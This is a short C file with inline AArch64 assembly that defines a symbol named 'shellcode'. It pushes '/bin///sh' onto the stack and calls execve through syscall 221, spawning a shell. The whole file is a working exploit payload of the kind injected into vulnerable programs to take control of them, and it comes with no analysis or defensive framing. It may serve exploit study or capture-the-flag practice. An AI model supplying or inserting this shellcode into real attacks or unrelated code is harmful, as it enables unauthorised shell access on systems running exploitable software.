__asm__(".global shellcode\n"
	"shellcode:\n\t"
	/* push b'/bin///sh\x00' */
	/* Set x14 = 8299904519029482031 = 0x732f2f2f6e69622f */
	"mov  x14, #25135\n\t"
	"movk x14, #28265, lsl #16\n\t"
	"movk x14, #12079, lsl #0x20\n\t"
	"movk x14, #29487, lsl #0x30\n\t"
	"mov  x15, #104\n\t"
	"stp x14, x15, [sp, #-16]!\n\t"
	/* execve(path='sp', argv=0, envp=0) */
	"mov  x0, sp\n\t"
	"mov  x1, xzr\n\t"
	"mov  x2, xzr\n\t"
	/* call execve() */
	"mov  x8, #221\n\t" // SYS_execve
	"svc 0");
